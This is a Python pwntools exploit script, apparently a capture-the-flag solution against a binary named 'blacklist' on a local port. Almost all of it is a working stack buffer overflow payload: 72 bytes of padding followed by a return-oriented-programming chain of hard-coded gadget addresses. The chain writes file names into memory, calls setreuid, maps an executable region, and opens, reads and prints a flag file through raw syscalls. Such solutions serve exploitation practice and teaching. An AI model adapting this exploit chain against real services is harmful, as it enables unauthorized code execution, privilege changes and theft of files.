from pwn import *

context.log_level = 'info'
"""
Plan:
	1-finding the flag name
	2-  mmap
		setruid
		open
		read
		write
"""
#p = process("./blacklist")
p = remote("localhost",1235)
#Gadgets#
poprdi = 0x0000000000401816
poprsi = 0x0000000000402516
poprdx = 0x0000000000401dd3
poprax = 0x0000000000401d8f
popr8  = 0x0000000000401d8e
popr9  = 0x0000000000401dcf
popr10 = 0x0000000000401dd2
syscallret = 0x000000000041880c
movraxedx = 0x0000000000466a6e
ret = 0x0000000000432fb0
#@#
BSS = 0x00000000004d1260
_flag = 0x67616c66
_txt = 0x7478742e
_eliz = 0x7a696c65
_abet = 0x74656261
###Payload###
payload = ""
payload += "A"*72
payload += p64(ret)
#Writing flag.txt in BSS#
payload += p64(poprdx)
payload += p64(_flag)
payload += p64(poprax)
payload += p64(BSS)
payload += p64(movraxedx)
payload += p64(poprdx)
payload += p64(_txt)
payload += p64(poprax)
payload += p64(BSS+4)
payload += p64(movraxedx)
#Writing elizabeth in BSS#
payload += p64(poprdx)
payload += p64(_eliz)
payload += p64(poprax)
payload += p64(BSS+64)
payload += p64(movraxedx)
payload += p64(poprdx)
payload += p64(_abet)
payload += p64(poprax)
payload += p64(BSS+68)
payload += p64(movraxedx)
payload += p64(poprdx)
payload += p64(0x68)
payload += p64(poprax)
payload += p64(BSS+72)
payload += p64(movraxedx)
#changing user id#
payload += p64(poprdi)
payload += p64(1000)
payload += p64(poprsi)
payload += p64(1000)
payload += p64(poprdx)
payload += p64(1000)
payload += p64(poprax)
payload += p64(113)
payload += p64(syscallret)
#performing mmap#
payload += p64(poprdi)
payload += p64(0x10000)
payload += p64(poprsi)
payload += p64(50)
payload += p64(poprdx)
payload += p64(7)
payload += p64(popr10)
payload += p64(34)
payload += p64(popr9)
payload += p64(0)
payload += p64(popr8)
payload += p64(0)
payload += p64(poprax)
payload += p64(9)
payload += p64(syscallret)
#Open flag file#
payload += p64(poprdi)
payload += p64(BSS)
payload += p64(poprsi)
payload += p64(0)
payload += p64(poprdx)
payload += p64(0)
payload += p64(poprax)
payload += p64(2)
payload += p64(syscallret)
#reading flag file content#
payload += p64(poprdi)
payload += p64(3)
payload += p64(poprsi)
payload += p64(0x10000)
payload += p64(poprdx)
payload += p64(50)
payload += p64(poprax)
payload += p64(0)
payload += p64(syscallret)
#writing flag to stdout#
payload += p64(poprdi)
payload += p64(1)
payload += p64(poprsi)
payload += p64(0x10000)
payload += p64(poprdx)
payload += p64(50)
payload += p64(poprax)
payload += p64(1)
payload += p64(syscallret)
pause()
p.sendline(payload)

p.interactive()